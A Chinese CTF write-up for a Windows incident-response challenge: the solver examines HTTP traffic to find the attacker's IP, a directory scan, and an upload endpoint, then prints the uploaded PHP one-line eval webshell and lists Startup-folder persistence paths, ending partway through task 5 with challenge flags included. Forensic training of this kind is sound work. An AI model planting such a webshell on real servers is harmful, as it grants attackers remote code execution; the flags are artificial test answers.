# 【CTF】暗魂CTF平台-windows应急响应-writeup

> 原文: https://www.ctfiot.com/206107.html
> ID: 206107

点击蓝字

关注我们

微信搜一搜

暗魂攻防实验室

题目描述

A集团的应用服务器被黑客入侵，该服务器的Web应用系统被上传恶意软件，系统文件被恶意软件破坏，您的团队需要帮助该公司追踪此网络攻击的来源，在服务器上进行全面的检查，包括日志信息、进程信息、系统文件、恶意文件等，从而分析黑客的攻击行为，发现系统中的漏洞，并对发现的漏洞进行修复。

0x01 任务1

提交攻击者IP地址的MD5值，提交的值无需使用flag{}

首先登录目标主机后，桌面上有wireshark文件，因为是web攻击，打开后筛选http的流量，查看所有HTTP的流量发现大多数都是192.168.192.1和192.168.192.132的通信流量，且右键追踪之后可知192.168.192.132为目标服务器的站点，所以攻击者地址为192.168.192.1

转换MD5值是 6729fb3ef240c05a7037797ba7a97fcf

0x02 任务2

攻击者最先使用了什么攻击（例：SQL注入）

通过对数据包的分析，可知一直在GET一些看起来诡异的路径

看起来就是在对目录进行扫描，所以最先使用了目录扫描攻击

0x03 任务3

网站根目录robots.txt内的内容是什么

这题很简单，去看看里面有没有搭建的网站，看到有phpstudy啥的就直接点进去看，或者直接C盘根目录搜索robots.txt

答案为：flag{hbrj6666666666666666}

0x04 任务4

攻击者通过那个路径进行的上传文件

通过筛选HTTP流，目录扫描完成后就开始上传文件，可以看到上传的路径为：/plugins/upload/uploadimg.php?fp=upimg且上传了一句话木马

0x05 任务5

提交攻击者上传的后门文件内容的MD5值

上个任务就看到了上传的一句话木马

<?php @eval($_POST['hbrj']);?>

cmd输入shell:startup
C:UsersAdministratorAppDataRoamingMicrosoftWindowsStart MenuProgramsStartup

C:ProgramDataMicrosoftWindowsStart MenuProgramsStartUp

联系微信客服

扫码联系

暗魂攻防实验室

微信搜一搜

暗魂攻防实验室


```
<?php @eval($_POST['hbrj']);?>
```



```
cmd输入shell:startup
C:UsersAdministratorAppDataRoamingMicrosoftWindowsStart MenuProgramsStartup
```



```
C:ProgramDataMicrosoftWindowsStart MenuProgramsStartUp
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/09/2-1726839251.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/09/0-1726839252.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/09/2-1726839253.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/09/2-1726839253.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/09/5-1726839253.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/09/2-1726839254.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/09/0-1726839255.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/09/7-1726839255.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/09/4-1726839256.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/09/3-1726839257.png)